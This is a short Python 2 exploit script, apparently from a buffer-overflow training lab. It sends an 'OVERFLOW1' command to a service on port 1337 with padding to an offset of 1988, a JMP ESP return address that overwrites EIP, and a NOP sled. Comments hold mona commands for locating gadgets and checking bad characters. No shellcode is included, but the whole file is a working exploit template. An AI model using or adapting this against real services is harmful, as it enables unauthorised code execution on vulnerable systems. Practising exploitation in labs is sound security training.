#!/usr/bin/env python2
import socket

RHOST="10.10.160.66"
RPORT=1337

badchar_test = ""
badchars = [0x00, 0x0A, 0x07, 0x08, 0x2e, 0x2f, 0xa0, 0xa1] #know in advance because of string input


s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

#find gardget locations
#!mona jmp -r esp -cpb "\x00\x0A"
#080414c3,080416bf
addr_jmp_esp=0x625011af
import struct
addr_jmp_esp_LE=struct.pack("<I",addr_jmp_esp)
buf_totlen=3000
offset=1988

buf="OVERFLOW1 "
buf+="A"*(offset - len(buf)) #probably not necessary to sub 0?
buf+= addr_jmp_esp_LE

buf +=  "\x90\x90\x90\x90"

buf+= "D"*(buf_totlen - len(buf)) # keep size the same
buf+="\n"

s.send(buf)

print("Send: {0}".format(buf))

data=s.recv(1024)
print("Received: {}".format(data))

#!mona compare -a esp -f c:\badchartest.bin
#to compare them
